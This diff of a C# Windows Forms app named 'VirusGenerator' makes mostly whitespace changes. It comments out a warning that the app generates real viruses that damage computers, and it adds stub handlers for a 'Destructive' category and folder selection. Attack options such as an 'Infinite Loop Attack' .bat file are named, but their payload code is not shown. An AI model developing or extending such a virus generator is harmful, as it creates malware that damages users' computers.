@@ -59,7 +59,7 @@ namespace VirusGenerator
     public partial class Troy : Form
     {
 
-       
+
 
         // Init class level variables
         string _outputFolder;
@@ -68,7 +68,7 @@ namespace VirusGenerator
         public Troy()
         {
             InitializeComponent();
-            MessageBox.Show("Warning: This program generates actual viruses that CAN and WILL damage your computer if you don't know what you are doing. Use at your own risk.", "WARNING!!!");
+            // MessageBox.Show("Warning: This program generates actual viruses that CAN and WILL damage your computer if you don't know what you are doing. Use at your own risk.", "WARNING!!!");
         }
         /// <summary>
         /// Purpose: When clicked, the 'generate' button writes a bunch of text to file and saves it with whatever format the user specified.
@@ -77,12 +77,12 @@ namespace VirusGenerator
         /// <param name="e"></param>
         private void BtnGen_Click(object sender, EventArgs e)
         {
-            
-            _outputFolder = @TxtBoxDes.Text; //The @ escapes the folder location (i.e C:\\Users\\..)
-            _fileName     = TxtBoxFileName.Text;
-            _fileExt      = CBoxFor.Text;
 
-            
+            _outputFolder = @TxtBoxDes.Text; //The @ escapes the folder location (i.e C:\\Users\\..)
+            _fileName = TxtBoxFileName.Text;
+            _fileExt = CBoxFor.Text;
+
+
 
             //Where the magic happens.
             if (CBoxAttack.Text == "Infinite Loop Attack" && _fileExt == ".bat")
@@ -131,11 +131,11 @@ namespace VirusGenerator
                 {
                     MessageBox.Show("The folder already exists!", "Notice");
                     ToolStrip.Text = "Folder already exists!";
-                    
+
                 }
-                
+
             }
-            
+
 
             if (CBoxAttack.Text == "Nyan Cat Bomb Attack")
             {
@@ -151,7 +151,7 @@ namespace VirusGenerator
 
             }
 
-   
+
         }
 
         /// <summary>
@@ -162,7 +162,7 @@ namespace VirusGenerator
         public void CBoxFor_SelectedIndexChanged(object sender, EventArgs e)
         {
             string formatSelected = CBoxFor.Text;
-          
+
             ToolStrip.Text = $"Format Selected: '{formatSelected}'"; //Updates tool stip with format
         }
 
@@ -219,6 +219,23 @@ namespace VirusGenerator
         private void closeToolStripMenuItem_Click(object sender, EventArgs e)
         {
             Close(); //closes program from the menu stip.
+        }
+
+        private void CBoxCategory_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            if(CBoxCategory.Text == "Destructive")
+            {
+                //CBoxAttack.
+            }
+        }
+
+        private void BtnFolderSelect_Click(object sender, EventArgs e)
+        {
+            FolderBrowserDialog folderSelect = new FolderBrowserDialog();
+            folderSelect.ShowDialog();
+
+            
+
         }
     }
 }
